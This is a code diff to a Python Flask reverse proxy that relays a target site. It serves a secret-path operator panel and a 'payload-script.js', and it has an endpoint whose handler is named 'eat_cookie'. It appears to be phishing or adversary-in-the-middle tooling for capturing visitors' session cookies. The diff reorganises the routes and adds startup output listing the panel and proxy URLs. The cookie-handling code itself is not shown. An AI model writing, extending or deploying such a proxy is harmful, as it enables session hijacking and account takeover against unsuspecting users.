@@ -73,22 +73,29 @@ def error_handler(func):
 
 def start_proxy(target, host, port, secret):
     app = Flask(__name__, static_folder='panel', static_url_path='')
-    
-    # Enable cross-origin requests
-    @app.after_request
-    def after_request(response):
-        response.headers.add('Access-Control-Allow-Origin', '*')
-        response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
-        response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
-        return response
+
+    # Serve panel files
+    @app.route(f'/{secret}')
+    def panel_index():
+        return send_from_directory('panel', 'index.html')
+
+    @app.route(f'/{secret}/<path:filename>')
+    def panel_files(filename):
+        return send_from_directory('panel', filename)
+
+    # Serve payload script
+    @app.route('/payload-script.js')
+    def serve_payload():
+        return send_from_directory('.', 'payload-script.js')
 
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
     def proxy(path):
+        # Check if it's a panel request
         if path.startswith(secret):
-            return send_from_directory('panel', 'index.html')
+            return panel_index()
 
-        # Build target URL (without www handling)
+        # Build target URL
         target_url = f"https://{target}/{path}"
         
         # Forward headers but exclude some
@@ -148,10 +155,13 @@ def start_proxy(target, host, port, secret):
             print(f"Proxy Error: {str(e)}")
             return f"Error: {str(e)}", 500
 
-    # Serve payload script
-    @app.route('/payload-script.js')
-    def serve_payload():
-        return send_from_directory('.', 'payload-script.js')
+    # Enable cross-origin requests
+    @app.after_request
+    def after_request(response):
+        response.headers.add('Access-Control-Allow-Origin', '*')
+        response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
+        response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
+        return response
 
     @app.route('/ep/api/ping', methods=['POST'])
     def eat_cookie():
@@ -585,4 +595,6 @@ def start_proxy(target, host, port, secret):
         return jsonify({'status': 'success'}), 200
 
     ssl_context = None  # Remove SSL for now to get basic functionality working
+    print(f"\n[*] Panel URL: http://{host}:{port}/{secret}")
+    print(f"[*] Proxy running on http://{host}:{port}/")
     app.run(host='0.0.0.0', port=port, threaded=True)
